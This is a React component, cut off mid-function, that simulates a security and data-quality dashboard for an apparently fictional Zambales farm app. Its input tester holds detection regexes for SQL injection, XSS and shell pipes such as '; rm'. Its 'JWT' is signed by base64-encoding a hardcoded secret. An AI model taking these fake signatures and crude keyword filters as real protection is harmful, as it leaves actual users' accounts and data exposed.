import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  Shield, Key, Lock, Users, AlertTriangle, Terminal, Database, ShieldAlert,
  ShieldCheck, RefreshCw, Eye, EyeOff, CheckCircle2, XCircle, FileDown, 
  HelpCircle, Info, Radio, Smartphone, Activity, Clock, Wifi, Search,
  Download, Upload, AlertOctagon, Send, FileText, Check, Copy, FileCode, MapPin,
  Globe, Accessibility, Monitor, Tv
} from "lucide-react";
import { DATABASE_SCHEMAS } from "../data/databaseSchemas";
import DatabaseHubTab from "./DatabaseHubTab";

interface AuditLog {
  id: string;
  timestamp: string;
  event: string;
  severity: "info" | "warning" | "critical";
  source: string;
  details: string;
}

export default function SecurityTrustCenter() {
  const [activeSubTab, setActiveSubTab] = useState<"auth" | "protection" | "trust" | "admin" | "integrity" | "storage" | "storage_to_delete" | "accuracy" | "compatibility">("auth");
  
  // Simulated System Logs Pool
  const [auditLogs, setAuditLogs] = useState<AuditLog[]>([
    { id: "1", timestamp: "10:15:22", event: "Argon2id Key Derivation", severity: "info", source: "AuthEngine", details: "Derived password key using salt 0x9f32b... iterations=4 memory=65536" },
    { id: "2", timestamp: "10:14:10", event: "JWT Token Handshake", severity: "info", source: "SessionManager", details: "Dispatched secure refresh token with 7-day expiration index" },
    { id: "3", timestamp: "09:44:12", event: "SQL Injection Blocked", severity: "critical", source: "WAF_Interceptor", details: "Blocked query injection in search field from IP 112.198.11.23 (Botolan)" },
    { id: "4", timestamp: "09:30:05", event: "Scheduled Backup Success", severity: "info", source: "BackupDaemon", details: "Snapshot 'agrimind_prod_snap_20260707.sql.aes' encrypted and saved to storage" },
    { id: "5", timestamp: "08:15:00", event: "Failed Login Attempt", severity: "warning", source: "AuthEngine", details: "Failed credential challenge for user role 'staff' (IP: 112.198.12.8)" }
  ]);

  const addLog = (event: string, severity: "info" | "warning" | "critical", source: string, details: string) => {
    const now = new Date();
    const timeStr = now.toTimeString().split(' ')[0];
    const newLog: AuditLog = {
      id: Date.now().toString(),
      timestamp: timeStr,
      event,
      severity,
      source,
      details
    };
    setAuditLogs(prev => [newLog, ...prev]);
  };

  // --- TAB A: SECURE AUTHENTICATION STATE ---
  const [username, setUsername] = useState("mang_juan_botolan");
  const [password, setPassword] = useState("P@ssw0rd_Zambales!2026");
  const [pwdStrength, setPwdStrength] = useState({ score: 0, feedback: "Weak", color: "bg-rose-500" });
  const [showPassword, setShowPassword] = useState(false);
  const [mfaEnabled, setMfaEnabled] = useState(false);
  const [mfaCode, setMfaCode] = useState("");
  const [mfaVerified, setMfaVerified] = useState(false);
  const [jwtPayload, setJwtPayload] = useState({
    sub: "usr_9281a8b",
    name: "Mang Juan de la Cruz",
    role: "farmer",
    barangay: "Poblacion",
    iss: "sentinel-agrimind-auth",
    exp: Math.floor(Date.now() / 1000) + 3600
  });
  const [accessToken, setAccessToken] = useState("");
  const [refreshToken, setRefreshToken] = useState("");
  const [sessionTimeout, setSessionTimeout] = useState("15");

  // Calculate password strength
  useEffect(() => {
    let score = 0;
    if (password.length >= 8) score += 1;
    if (password.length >= 12) score += 1;
    if (/[A-Z]/.test(password)) score += 1;
    if (/[0-9]/.test(password)) score += 1;
    if (/[^A-Za-z0-9]/.test(password)) score += 1;

    let feedback = "Weak";
    let color = "bg-rose-500";
    if (score === 3) {
      feedback = "Moderate";
      color = "bg-amber-500";
    } else if (score === 4) {
      feedback = "Strong";
      color = "bg-emerald-500";
    } else if (score === 5) {
      feedback = "Enterprise Grade";
      color = "bg-cyan-500 animate-pulse";
    }

    setPwdStrength({ score, feedback, color });
  }, [password]);

  // Generate tokens based on current profile
  const handleGenerateTokens = () => {
    // Simulated JWT token generation
    const header = btoa(JSON.stringify({ alg: "HS256", typ: "JWT" })).replace(/=/g, "");
    const payload = btoa(JSON.stringify(jwtPayload)).replace(/=/g, "");
    const signature = btoa("sha256_hmac_secret_key_botolan_enterprise").slice(0, 32).replace(/=/g, "");
    
    setAccessToken(`${header}.${payload}.${signature}`);
    setRefreshToken(`rf_` + btoa(Math.random().toString()).slice(0, 48).replace(/=/g, ""));
    addLog("JWT Access Token Dispatched", "info", "AuthEngine", "Issued tokens with signature verification payload HS256");
  };

  useEffect(() => {
    handleGenerateTokens();
  }, [jwtPayload]);

  // --- TAB B: THREAT PROTECTION STATE ---
  const [inputTestValue, setInputTestValue] = useState("");
  const [validationResult, setValidationResult] = useState<{ status: "idle" | "safe" | "blocked", message: string, rules?: string[] }>({ status: "idle", message: "" });
  const [rateLimitCount, setRateLimitCount] = useState(0);
  const [rateLimitLock, setRateLimitLock] = useState(0);
  const [uploadedFile, setUploadedFile] = useState<{ name: string; size: string; status: "idle" | "scanning" | "secure" | "infected", secureName?: string } | null>(null);

  // Rate Limiting simulation
  const triggerApiRequest = () => {
    if (rateLimitLock > 0) {
      addLog("Blocked by Rate Limiter", "critical", "WAF_Limiter", `IP temporarily locked out. T-minus ${rateLimitLock}s`);
      return;
    }
    setRateLimitCount(prev => {
      const next = prev + 1;
      if (next >= 5) {
        setRateLimitLock(15);
        addLog("HTTP 429 Triggered", "warning", "WAF_Limiter", "Too many requests. 15s cooling lockout established.");
        return 5;
      }
      addLog("API Request Accepted", "info", "AppServer", `Request ${next}/5 accepted under active rate-limiting window`);
      return next;
    });
  };

  useEffect(() => {
    if (rateLimitLock > 0) {
      const timer = setTimeout(() => setRateLimitLock(prev => prev - 1), 1000);
      return () => clearTimeout(timer);
    } else if (rateLimitLock === 0 && rateLimitCount === 5) {
      setRateLimitCount(0);
    }
  }, [rateLimitLock, rateLimitCount]);

  // Input sanitization & Zod Simulator
  const testInputAgainstRules = (inputStr: string) => {
    if (!inputStr.trim()) {
      setValidationResult({ status: "idle", message: "" });
      return;
    }

    const rules = [
      "Reject if length > 256 bytes",
      "Scan for SQL Command blocks (UNION, SELECT, WHERE)",
      "Scan for Script elements (<script>, javascript:)",
      "Scan for shell pipe commands (; rm, |, &&)"
    ];

    // Check rules
    if (inputStr.length > 256) {
      setValidationResult({
        status: "blocked",
        message: "Rejected: Schema validation failed. Maximum payload length exceeded (256 bytes ceiling).",
        rules
      });
      addLog("Payload Oversized Reject", "warning", "ZodValidator", "Rejected request: string exceeds 256 byte threshold");
      return;
    }

    if (/SELECT|UNION|WHERE|OR\s+['\"]/i.test(inputStr)) {
      setValidationResult({
        status: "blocked",
        message: "Rejected: Potential SQL Injection signature detected. Threat blocked by application tier.",
        rules
      });
      addLog("SQLi Threat Defeated", "critical", "WAF_Interceptor", `Blocked query block: '${inputStr.substring(0, 30)}...'`);
      return;
    }

    if (/<script|javascript:|onload|onerror/i.test(inputStr)) {
      setValidationResult({
        status: "blocked",
        message: "Rejected: Cross-Site Scripting (XSS) HTML payload caught. String sanitized and dropped.",
        rules
      });
      addLog("XSS Injection Prevented", "critical", "XSS_Filter", `Sanitized script parameters from request stream`);
      return;
    }

    if (/;|&&|\|/i.test(inputStr)) {
      setValidationResult({
        status: "blocked",
        message: "Rejected: Shell command execution characters detected. System integrity protected.",
        rules
      });
      addLog("Remote Command Blocked", "critical", "SecurityShield", `Dropped command pipe execution signature`);
      return;
    }

    setValidationResult({
      status: "safe",
      message: "Validation Passed: Input schema strictly validated as Safe. Request authorized to reach database.",
      rules
    });
    addLog("Input validated safe", "info", "ZodValidator", "Completed schema parsing; query matches alphanumeric criteria");
  };

  // Upload file simulator
  const handleSimulateUpload = (infected: boolean) => {
    const filename = infected ? "malicious_rootkit_advisory.exe" : "farm_soil_report_july.pdf";
    setUploadedFile({
      name: filename,
      size: infected ? "12.4 MB" : "840 KB",
      status: "scanning"
    });
    addLog("Upload Initiated", "info", "FileUploadService", `Validating files headers & magic bytes for ${filename}`);

    setTimeout(() => {
      if (infected) {
        setUploadedFile({
          name: filename,
          size: "12.4 MB",
          status: "infected"
        });
        addLog("Virus Scan Hit!", "critical", "AntivirusHeuristic", "Signature match detected! Executable masquerading dropped immediately.");
      } else {
        const randomHash = Math.random().toString(36).substring(2, 10);
        const renamed = `upload_sanitized_${randomHash}.pdf`;
        setUploadedFile({
          name: filename,
          size: "840 KB",
          status: "secure",
          secureName: renamed
        });
        addLog("File Sanitized & Persisted", "info", "SecureStorage", `Stored ${filename} as hash file: ${renamed}`);
      }
    }, 1800);
  };

  // --- TAB D: ADMIN CONTROL BOARD ---
  // --- DATA QUALITY & INTEGRITY STATES ---
  const [dbRecordsCount, setDbRecordsCount] = useState(148);
  const [duplicateCount, setDuplicateCount] = useState(0);
  const [pendingVerification, setPendingVerification] = useState(7);
  const [failedImports, setFailedImports] = useState(0);
  const [dataQualityScore, setDataQualityScore] = useState(97.0);
  const [isDeduplicating, setIsDeduplicating] = useState(false);

  // --- DYNAMIC DATA QUALITY CORE & MONITORING STATES ---
  const [dqMissingValues, setDqMissingValues] = useState(3);
  const [dqDuplicateRecords, setDqDuplicateRecords] = useState(0);
  const [dqInvalidValues, setDqInvalidValues] = useState(0);
  const [dqExpiredData, setDqExpiredData] = useState(1);
  const [dqFailedImports, setDqFailedImports] = useState(0);
  const [dqSyncErrors, setDqSyncErrors] = useState(0);
  const [dqOutdatedWeather, setDqOutdatedWeather] = useState(false);
  const [dqBrokenReferences, setDqBrokenReferences] = useState(0);

  const [dqLastValidationTime, setDqLastValidationTime] = useState<string>("2 Minutes Ago");
  const [isRefreshingDq, setIsRefreshingDq] = useState(false);

  // Computed properties
  const calcDQCompleteness = () => {
    let score = 100 - (dqMissingValues * 4) - (dqBrokenReferences * 8);
    return Math.max(0, Math.min(100, score));
  };
  const calcDQAccuracy = () => {
    let score = 100 - (dqInvalidValues * 6) - (dqFailedImports * 12);
    return Math.max(0, Math.min(100, score));
  };
  const calcDQConsistency = () => {
    let score = 100 - (dqDuplicateRecords * 10) - (dqSyncErrors * 8);
    return Math.max(0, Math.min(100, score));
  };
  const calcDQTimeliness = () => {
    let score = 100 - (dqOutdatedWeather ? 15 : 0) - (dqExpiredData * 5);
    return Math.max(0, Math.min(100, score));
  };
  const calcDQOverall = () => {
    const comp = calcDQCompleteness();
    const acc = calcDQAccuracy();
    const cons = calcDQConsistency();
    const time = calcDQTimeliness();
    return Math.round((comp + acc + cons + time) / 4);
  };

  // Automated Validation Sandbox Form State
  const [sandboxFarmArea, setSandboxFarmArea] = useState("2.5");
  const [sandboxPhone, setSandboxPhone] = useState("09171234567");
  const [sandboxEmail, setSandboxEmail] = useState("juan@botolan.gov.ph");
  const [sandboxPlantDate, setSandboxPlantDate] = useState("2026-06-01");
  const [sandboxHarvestDate, setSandboxHarvestDate] = useState("2026-10-15");
  const [sandboxValErrors, setSandboxValErrors] = useState<string[]>([]);
  const [sandboxSuccess, setSandboxSuccess] = useState(false);

  // AI Inspector Simulator State
  const [aiWeatherQuality, setAiWeatherQuality] = useState<"excellent" | "stale" | "offline">("excellent");
  const [aiSoilQuality, setAiSoilQuality] = useState<"excellent" | "moderate" | "missing">("excellent");
  const [aiCropQuality, setAiCropQuality] = useState<"excellent" | "incomplete">("excellent");
  const [aiMarketQuality, setAiMarketQuality] = useState<"excellent" | "outdated">("excellent");
  const [aiInspectionReport, setAiInspectionReport] = useState<any | null>(null);
  const [aiRecommendationText, setAiRecommendationText] = useState<string>("");
  const [aiIsRunning, setAiIsRunning] = useState(false);

  // Schema Validator Form State
  const [farmerNameVal, setFarmerNameVal] = useState("Juan Dela Cruz");
  const [farmerPhoneVal, setFarmerPhoneVal] = useState("09171234567");
  const [farmerEmailVal, setFarmerEmailVal] = useState("juan.delacruz@botolan.gov.ph");
  const [farmerLatVal, setFarmerLatVal] = useState("15.2912");
  const [farmerLngVal, setFarmerLngVal] = useState("120.0125");
  const [farmerAreaVal, setFarmerAreaVal] = useState("2.5");
  const [farmerCropVal, setFarmerCropVal] = useState("Palay Rice");
  const [farmerBarangayVal, setFarmerBarangayVal] = useState("Poblacion");
  const [farmerRsbsaVal, setFarmerRsbsaVal] = useState("03-71-02-001-00412");
  const [schemaErrors, setSchemaErrors] = useState<string[]>([]);
  const [schemaSuccessMsg, setSchemaSuccessMsg] = useState("");

  // Transaction simulator State
  const [txFailAtStep, setTxFailAtStep] = useState<"none" | "step3" | "step4">("none");
  const [txStatus, setTxStatus] = useState<"idle" | "running" | "success" | "rolledback">("idle");
  const [txStep, setTxStep] = useState<number>(0);

  // Soft-Delete & Version History State
  const [farmProfiles, setFarmProfiles] = useState([
    { id: "550e8400-e29b-41d4-a716-446655440001", farmerName: "Mang Juan de la Cruz", cropType: "Palay Rice", area: 2.5, barangay: "Poblacion", verifiedState: "Verified", deletedAt: null as string | null, versions: [{ timestamp: "2026-07-07 08:00 UTC", changedBy: "system", changeSummary: "Initial import profile" }] },
    { id: "550e8400-e29b-41d4-a716-446655440002", farmerName: "Aling Nena Santos", cropType: "Saba Banana", area: 1.8, barangay: "Batonlapoc", verifiedState: "Verified", deletedAt: null as string | null, versions: [{ timestamp: "2026-07-07 08:05 UTC", changedBy: "system", changeSummary: "Initial import profile" }] },
    { id: "550e8400-e29b-41d4-a716-446655440003", farmerName: "Mang Tomas Magsaysay", cropType: "Sweet Corn", area: 3.2, barangay: "Carael", verifiedState: "Estimated", deletedAt: null as string | null, versions: [{ timestamp: "2026-07-07 08:10 UTC", changedBy: "system", changeSummary: "Initial import profile" }] }
  ]);
  const [archivedProfiles, setArchivedProfiles] = useState<any[]>([]);
  const [selectedProfileId, setSelectedProfileId] = useState<string | null>(null);
  const [editAreaValue, setEditAreaValue] = useState("");
  const [editCropValue, setEditCropValue] = useState("");

  const [sessions, setSessions] = useState([
    { id: "s1", device: "Android (Infinix Hot 30)", location: "Botolan Poblacion", ip: "112.198.12.8", active: true },
    { id: "s2", device: "Chrome (Windows Desktop)", location: "Botolan Barangay Hall", ip: "112.198.11.23", active: true },
    { id: "s3", device: "Safari (iPhone 14 Pro)", location: "Batonlapoc Fields", ip: "122.54.91.4", active: false }
  ]);
  const [isBackingUp, setIsBackingUp] = useState(false);
  const [backupDownloadUrl, setBackupDownloadUrl] = useState<string | null>(null);

  const [copiedText, setCopiedText] = useState<string | null>(null);

  const handleCopySchema = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(id);
    setTimeout(() => setCopiedText(null), 2000);
  };

  const handleRevokeSession = (id: string, device: string) => {
    setSessions(prev => prev.filter(s => s.id !== id));
    addLog("Session Revoked", "warning", "SessionManager", `Revoked access credentials for device: ${device}`);
  };

  // --- DATA ACCURACY & SOURCING HUB STATES ---
  const [accuracyWidget, setAccuracyWidget] = useState<"weather" | "irrigation" | "market">("weather");
  const [accuracyWidgetStatus, setAccuracyWidgetStatus] = useState<"healthy" | "stale" | "offline">("healthy");
  const [accuracyConfidenceOverride, setAccuracyConfidenceOverride] = useState<number>(91);
  const [sourcingDiscrepancyFilter, setSourcingDiscrepancyFilter] = useState<string>("all");
  const [selectedStatusTagFilter, setSelectedStatusTagFilter] = useState<string>("all");

  const [weatherSources, setWeatherSources] = useState({
    primary: { name: "PAGASA Subic Radar Station", temp: "31.2°C", rainProb: "85%", status: "online", lastUpdated: "08:42 AM", confidence: "High" },
    backup: { name: "OpenWeatherMap API Node", temp: "32.5°C", rainProb: "78%", status: "online", lastUpdated: "08:30 AM", confidence: "Medium" },
    cached: { name: "Local Cache Database", temp: "31.0°C", rainProb: "80%", status: "stale", lastUpdated: "07:00 AM", confidence: "Low" }
  });

  const [marketSources, setMarketSources] = useState({
    primary: { name: "Zambales Dept of Agriculture", palayPrice: "24.50 PHP/kg", status: "online", lastUpdated: "06:00 AM", confidence: "High" },
    backup: { name: "Botolan Municipal Office", palayPrice: "24.00 PHP/kg", status: "online", lastUpdated: "07:30 AM", confidence: "High" },
    cooperative: { name: "Poblacion Rice Coop Board", palayPrice: "22.50 PHP/kg", status: "online", lastUpdated: "08:15 AM", confidence: "Medium" }
  });

  const [activeSourcingConflicts, setActiveSourcingConflicts] = useState<Array<{ id: string; domain: string; desc: string; severity: "warning" | "info" | "critical"; resolved: boolean }>>([
    { id: "conf-1", domain: "Market Prices", desc: "Cooperative board reported Palay at 22.50 PHP, but Dept of Agriculture reports 24.50 PHP (8% discrepancy).", severity: "warning", resolved: false },
    { id: "conf-2", domain: "Weather Data", desc: "OpenWeatherMap API returned 3.5mm rain forecast, while PAGASA verified 0.2mm (significant variance).", severity: "info", resolved: false }
  ]);

  const [userSubmissions, setUserSubmissions] = useState<Array<{ id: string; farmer: string; barangay: string; category: string; value: string; status: "Pending Review" | "Verified" | "Published"; timestamp: string; verifiedBy?: string }>>([
    { id: "sub-1", farmer: "Juan Dela Cruz", barangay: "Poblacion", category: "Soil Moisture Reading", value: "34% (Field B Volumetric)", status: "Pending Review", timestamp: "2026-07-07 08:12 AM" },
    { id: "sub-2", farmer: "Tomas Magsaysay", barangay: "Carael", category: "Pest Sighting: Rice Blast", value: "Mild infestation in southern patch", status: "Pending Review", timestamp: "2026-07-07 09:30 AM" },
    { id: "sub-3", farmer: "Nena Santos", barangay: "Batonlapoc", category: "Harvest Yield", value: "5.2 tons per hectare (Palay)", status: "Verified", timestamp: "2026-07-06 04:15 PM", verifiedBy: "Officer Gomez" }
  ]);

  const [verificationTerminalLog, setVerificationTerminalLog] = useState<string[]>([
    "Initialize Data Provenance Validator v1.0.4...",
    "System status: Ready for integrity cross-checking loop."
  ]);
  const [isCheckingIntegrity, setIsCheckingIntegrity] = useState(false);

  // --- SYSTEM COMPATIBILITY HUB STATES ---
  const [selectedNetworkSpeed, setSelectedNetworkSpeed] = useState<"high-speed" | "mobile-4g" | "slow-3g" | "offline">("high-speed");
  const [selectedDeviceMode, setSelectedDeviceMode] = useState<"desktop" | "tablet" | "mobile" | "ultrawide">("desktop");
  const [accessibilityHighContrast, setAccessibilityHighContrast] = useState(false);
  const [accessibilityReducedMotion, setAccessibilityReducedMotion] = useState(false);
  const [accessibilityColorFilter, setAccessibilityColorFilter] = useState<"none" | "protanopia" | "deuteranopia" | "tritanopia">("none");
  const [accessibilityShowAria, setAccessibilityShowAria] = useState(false);
  
  const [compatUploadFileName, setCompatUploadFileName] = useState("field_survey_july.xlsx");
  const [compatUploadFileType, setCompatUploadFileType] = useState("XLSX");
  const [compatUploadFileSize, setCompatUploadFileSize] = useState(2.4); // 2.4 MB
  const [compatFileValidationLog, setCompatFileValidationLog] = useState<string[]>([
    "Ready for client-side multi-format validation challenge..."
  ]);
  const [compatFileValidationStatus, setCompatFileValidationStatus] = useState<"idle" | "validating" | "success" | "error">("idle");

  const [compatSelectedAiProvider, setCompatSelectedAiProvider] = useState<"gemini" | "openai" | "local" | "llama">("gemini");
  const [compatAiPromptInput, setCompatAiPromptInput] = useState("Suggest progressive failsafe irrigation cycles for Zambales dry soils.");
  const [compatAiRoutingLog, setCompatAiRoutingLog] = useState<string[]>([
    "Modular AI provider routing model initialized...",
    "Authoritative model target: Google Gemini-1.5-Flash (Active)"
  ]);
  const [compatAiIsRouting, setCompatAiIsRouting] = useState(false);

  const [compatPwaInstalled, setCompatPwaInstalled] = useState(false);
  const [compatPwaSyncQueue, setCompatPwaSyncQueue] = useState(0);

  // Localization
  const [compatLanguage, setCompatLanguage] = useState<"en" | "ph" | "il">("en");
  const [compatTimezone, setCompatTimezone] = useState<"Asia/Manila" | "UTC" | "EST">("Asia/Manila");
  const [compatCurrency, setCompatCurrency] = useState<"PHP" | "USD">("PHP");

  // Integration connectors pings
  const [integrationPingStatus, setIntegrationPingStatus] = useState<{ [key: string]: "idle" | "pinging" | "success" | "error" }>({
    weather: "idle",
    sensors: "idle",
    gis: "idle",
    gov_data: "idle",
    sms: "idle"
  });

  // --- Missing states for Enterprise Master Storage and Restore/Verification ---
  const [restorationLog, setRestorationLog] = useState<string[]>([]);
  const [backupLogs, setBackupLogs] = useState<any[]>([
    { id: "bak-101", filename: "agrimind_full_backup_20260701.sql.aes", type: "full", size: "340 MB", timestamp: "2026-07-01 02:00:00 UTC", sha256: "sha256_8f293b1d", status: "verified" },
    { id: "bak-102", filename: "agrimind_incremental_backup_20260706.sql.aes", type: "incremental", size: "12 MB", timestamp: "2026-07-06 02:00:00 UTC", sha256: "sha256_31c9e8d1", status: "unverified" }
  ]);
  const [selectedRestoreBackupId, setSelectedRestoreBackupId] = useState<string>("bak-102");
  const [restoreVerificationStatus, setRestoreVerificationStatus] = useState<string>("idle");
  const [selectedClassResource, setSelectedClassResource] = useState<string>("public_weather");
  const [selectedClassRole, setSelectedClassRole] = useState<string>("farmer");
  const [classificationAuditResult, setClassificationAuditResult] = useState<any | null>(null);
  
  const [spatialTargetFarm, setSpatialTargetFarm] = useState<string>("550e8400-e29b-41d4-a716-446655440001");
  const [selectedGisLayer, setSelectedGisLayer] = useState<string>("flood");
  const [spatialIntersectionResult, setSpatialIntersectionResult] = useState<string>("");
  const [isQueryingSpatial, setIsQueryingSpatial] = useState<boolean>(false);
  
  const [mockFileToUpload, setMockFileToUpload] = useState<string>("soil_sample_map.jpg");
  const [mockFileSizeToUpload, setMockFileSizeToUpload] = useState<string>("1.8 MB");
  const [fileCategory, setFileCategory] = useState<string>("Soil");
  const [isUploadingStorage, setIsUploadingStorage] = useState<boolean>(false);
  const [storageFileList, setStorageFileList] = useState<any[]>([
    { id: "media-1", originalName: "soil_sample_map.jpg", size: "1.8 MB", secureUrl: "#", uploader: "admin_operator", uploadedAt: "2026-07-07 10:14:10 UTC", category: "Soil" }
  ]);
  
  const [clientFarmVal] = useState({
    area: 2.8,
    cropType: "Palay Rice (Super Hybrid)",
    lastModified: "Modified offline • 08:41 AM",
  });
  const [serverFarmVal] = useState({
    area: 2.5,
    cropType: "Palay Rice (Traditional)",
    lastModified: "Server version • 08:35 AM",
  });
  const [resolutionStrategy, setResolutionStrategy] = useState<string>("client");
  const [syncLogs, setSyncLogs] = useState<string[]>([]);
  const [isCreatingBackup, setIsCreatingBackup] = useState<boolean>(false);
  const [txDetailLogs, setTxDetailLogs] = useState<string[]>([]);
  const [txWorkflowType, setTxWorkflowType] = useState<string>("register_farmer");
  const [syncStatus, setSyncStatus] = useState<string>("synced");

  // --- SYSTEM COMPATIBILITY HANDLERS ---
  const handleValidateCompatFile = (e: React.FormEvent) => {
    e.preventDefault();
    setCompatFileValidationStatus("validating");
    setCompatFileValidationLog([
      `🔍 [Security Audit] Initiating Client-Side Structural Sanity Check on file: ${compatUploadFileName}...`,
      `⏱️ Scanning binary file footprint (Reported size: ${compatUploadFileSize} MB)`
    ]);

    setTimeout(() => {
      // Validate MIME mapping and extensions
      const allowedExts = ["JPG", "PNG", "WEBP", "PDF", "CSV", "XLSX"];
      const extUpper = compatUploadFileType.toUpperCase();
      
      setCompatFileValidationLog(prev => [
        ...prev,
        `📁 Parsing extension signature: [.${compatUploadFileType.toLowerCase()}] (Detected Standard MIME mapping)`
      ]);

      setTimeout(() => {
        const errors: string[] = [];
        if (!allowedExts.includes(extUpper)) {
          errors.push(`MIME validation FAILED: .${compatUploadFileType.toLowerCase()} is not an enterprise-approved crop intelligence format.`);
        }
        if (compatUploadFileSize > 10.0) {
          errors.push(`Ceiling Limit FAILED: File is ${compatUploadFileSize} MB. The maximum allowable single file transmission limit is 10.0 MB.`);
        }

        if (errors.length > 0) {
          setCompatFileValidationLog(prev => [
            ...prev,
            ...errors.map(err => `❌ ${err}`),
            "🔴 File rejected. Pipeline transmission aborted to preserve database integrity & bandwidth failsafe rules."
          ]);
          setCompatFileValidationStatus("error");
          addLog("File Validation Rejected", "warning", "CompatibilitySandbox", `Rejected file '${compatUploadFileName}' (${compatUploadFileSize}MB) due to format/size constraint violation.`);
        } else {
          setCompatFileValidationLog(prev => [
            ...prev,
            `✓ Security signature checks PASSED. Standard header magic bytes successfully verified.`,
            `✓ File size within acceptable limits (Hectare storage allocation safe).`,
            `🟢 Success: '${compatUploadFileName}' successfully approved and parsed into transient memory arrays.`
          ]);
          setCompatFileValidationStatus("success");
          addLog("File Upload Validated", "info", "CompatibilitySandbox", `Validated and parsed progressive upload file '${compatUploadFileName}' successfully.`);
        }
      }, 1000);
    }, 1000);
  };

  const handleRouteAiRequest = (e: React.FormEvent) => {
    e.preventDefault();
    setCompatAiIsRouting(true);
    setCompatAiRoutingLog([
      `⚡ [AI Router] Intercepting prompt: "${compatAiPromptInput}"`,
      `🧬 Abstract Provider Interface routing logic started...`
    ]);

    setTimeout(() => {
      let targetProviderUrl = "";
      let modelSignature = "";
      if (compatSelectedAiProvider === "gemini") {
        targetProviderUrl = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash";
        modelSignature = "models/gemini-1.5-flash-002";
      } else if (compatSelectedAiProvider === "openai") {
        targetProviderUrl = "https://api.openai.com/v1/chat/completions";
        modelSignature = "gpt-4o-mini";
      } else if (compatSelectedAiProvider === "local") {
        targetProviderUrl = "http://localhost:11434/api/generate";
        modelSignature = "ollama/llama3.1-8b-instruct";
      } else {
        targetProviderUrl = "https://api.replicate.com/v1/predictions";
        modelSignature = "meta/llama-3-70b-instruct";
      }

      setCompatAiRoutingLog(prev => [
        ...prev,
        `🔗 Connecting to provider endpoint: ${targetProviderUrl}`,
        `🔑 Verifying client authentication token references (Lazily loaded from safe server vaults)`,
        `📡 Active API Model ID: ${modelSignature}`
      ]);

      setTimeout(() => {
        let responseContent = "";
        if (compatSelectedAiProvider === "gemini") {
          responseContent = "[Gemini-1.5-Flash] Verified Recommendation: For dry Zambales clay-loams, introduce a staggered alternate-wetting-and-drying (AWD) cycle. Irrigate to a soil sensor depth of 15cm, then allow natural dry drainage for 4 days before re-flooding.";
        } else if (compatSelectedAiProvider === "openai") {
          responseContent = "[GPT-4o-mini] Recommendation: Standard AWD irrigation is recommended. Wait for soil moisture readings to hit 18% before releasing Botolan lateral reservoir valves.";
        } else {
          responseContent = `[${compatSelectedAiProvider.toUpperCase()} Local Model] Recommendation: Alternate irrigation is recommended. Avoid over-watering to protect localized root nodules. Maintain strict moisture caps.`;
        }

        setCompatAiRoutingLog(prev => [
          ...prev,
          `✓ Received verified response payload from backend model endpoint.`,
          `📝 Output: "${responseContent}"`,
          `🟢 AI Session finalized. Token consumption: 142 tokens. Response latency: 480ms.`
        ]);
        setCompatAiIsRouting(false);
        addLog("AI Prompt Routed", "info", "ModularAiRouter", `Routed user query to standard provider: ${compatSelectedAiProvider.toUpperCase()} (${modelSignature})`);
      }, 1200);
    }, 1000);
  };

  const handlePingConnector = (connectorId: string) => {
    setIntegrationPingStatus(prev => ({ ...prev, [connectorId]: "pinging" }));
    addLog("Connector Handshake Pinged", "info", "IntegrationGateway", `Pinging modular external connector: ${connectorId.toUpperCase()}...`);

    setTimeout(() => {
      const isSuccess = Math.random() > 0.15; // 85% success rate
      setIntegrationPingStatus(prev => ({ ...prev, [connectorId]: isSuccess ? "success" : "error" }));
      if (isSuccess) {
        addLog("Connector Handshake Success", "info", "IntegrationGateway", `Verified handshake connection with ${connectorId.toUpperCase()} gateway v1.0.4. Response Code: 200 OK.`);
      } else {
        addLog("Connector Handshake Failed", "warning", "IntegrationGateway", `Handshake timeout with ${connectorId.toUpperCase()} endpoint. Gracefully dropping to failsafe backup cache.`);
      }
    }, 1200);
  };

  const handleTogglePwaInstall = () => {
    if (compatPwaInstalled) {
      setCompatPwaInstalled(false);
      addLog("PWA Uninstalled", "warning", "PwaServiceWorker", "Simulated PWA uninstalled from user desktop device. Home Screen launcher shortcut deleted.");
    } else {
      setCompatPwaInstalled(true);
      addLog("PWA Installed", "info", "PwaServiceWorker", "Pwa application successfully pinned to user client desktop. Offline cache synchronization index created.");
    }
  };

  const handleSimulateOfflineSync = () => {
    if (selectedNetworkSpeed !== "offline") {
      alert("Please simulate Offline Mode in the network dropdown first to pile up offline sync records!");
      return;
    }
    setCompatPwaSyncQueue(prev => prev + 1);
    addLog("Offline Action Queued", "info", "PwaServiceWorker", "Offline mode active. Intercepted request and queued in local IndexedDB pipeline queue for background sync.");
  };

  const handleSyncOfflineData = () => {
    if (selectedNetworkSpeed === "offline") {
      alert("Reconnect network link first by selecting a connected speed mode (High-speed, 4G, or 3G)!");
      return;
    }
    if (compatPwaSyncQueue === 0) {
      alert("No offline actions queued. Go offline and write/queue actions first!");
      return;
    }
    addLog("PWA Background Sync Initiated", "info", "PwaServiceWorker", `Sync Engine: Processing ${compatPwaSyncQueue} queued local actions...`);
    setTimeout(() => {
      setCompatPwaSyncQueue(0);
      addLog("PWA Sync Sequence Success", "info", "PwaServiceWorker", "Sync complete! Background IndexedDB changes merged into relational server databases without conflicts.");
    }, 1500);
  };

  // Submit new mock submission form
  const [newSubFarmer, setNewSubFarmer] = useState("Mang Tomas");
  const [newSubBarangay, setNewSubBarangay] = useState("Carael");
  const [newSubCategory, setNewSubCategory] = useState("Soil Moisture Reading");
  const [newSubValue, setNewSubValue] = useState("28%");

  const handleCreateSubmission = (e: React.FormEvent) => {
    e.preventDefault();
    const newSub = {
      id: "sub-" + (userSubmissions.length + 1),
      farmer: newSubFarmer,
      barangay: newSubBarangay,
      category: newSubCategory,
      value: newSubValue,
      status: "Pending Review" as const,
      timestamp: "2026-07-07 " + new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };
    setUserSubmissions(prev => [newSub, ...prev]);
    setPendingVerification(prev => prev + 1);
    addLog("User Submission Created", "info", "ProvenanceEngine", `New farmer report logged: ${newSubCategory} [${newSubValue}]`);
  };

  const handleResolveConflictItem = (id: string) => {
    setActiveSourcingConflicts(prev => prev.map(c => c.id === id ? { ...c, resolved: true } : c));
    addLog("Sourcing Conflict Resolved", "info", "AdminReview", `Resolved data divergence discrepancy for ID: ${id}. Overrode with PAGASA/Gov primary authoritative parameters.`);
  };

  const handleVerifySubmission = (id: string) => {
